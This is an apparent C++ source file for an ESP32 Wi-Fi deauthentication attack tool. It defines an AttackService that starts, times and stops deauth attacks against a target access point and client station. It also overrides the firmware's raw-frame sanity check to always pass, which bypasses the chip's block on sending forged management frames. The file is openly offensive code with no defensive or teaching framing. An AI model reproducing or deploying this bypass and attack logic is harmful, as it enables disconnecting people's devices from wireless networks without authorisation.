#include "Networks/Services/AttackService.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);


AttackService::~AttackService() {
    stopAttack();
}

void AttackService::attackTask(void *param){
    AttackService* self = static_cast<AttackService*>(param);

    self->currentStatus = attack_status_t::Running;
    self->deauthAttack->start(&(self->stopRequested), DEFAULT_SECONDS_DEAUTH);

    self->currentStatus = self->deauthAttack->getStatus();
    self->elapsedMillis = millis();
    
    Serial.print("\nExecution time: ");
    Serial.println(self->getExecutionTime());

    self->attackTaskHandle = nullptr;

    if(self->currentStatus == attack_status_t::Completed) self->led.handleStatus(ColorsRGB::COMPLETED);

    vTaskDelete(NULL);
}

void AttackService::startDeauthAttack(const MacAddress& sourceAP, const MacAddress& targetSTA, unsigned int seconds){
    stopAttack(); // stop any previous attack

    deauthAttack = new AttackDeauth(sourceAP, targetSTA);

    stopRequested = false;
    startMillis = millis();
    
    led.handleStatus(ATTACK);

    xTaskCreatePinnedToCore(
        attackTask,
        "AttackTask",
        4096,
        this,
        1,
        &attackTaskHandle,
        APP_CPU_NUM
    );

    currentType = attack_t::Deauth;
}

void AttackService::stopAttack(){
    if (currentType == attack_t::Deauth && attackTaskHandle != nullptr) {
        // cooperative stop
        stopRequested = true;

        // wait until task clears its handle
        while (attackTaskHandle != nullptr) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    // now it’s safe to delete the object
    if (deauthAttack != nullptr) {
        delete deauthAttack;
        deauthAttack = nullptr;
    }

    currentType = attack_t::None;
    currentStatus = attack_status_t::Idle;
}

void AttackService::cancelAttack(){
    stopAttack();
    led.handleStatus(CANCELED);
}

attack_t AttackService::getCurrentType() const {
    return currentType;
}

attack_status_t AttackService::getCurrentStatus() const {
    return currentStatus;
}

unsigned long AttackService::getExecutionTime(){
    return elapsedMillis != 0 ? elapsedMillis - startMillis : 0;
}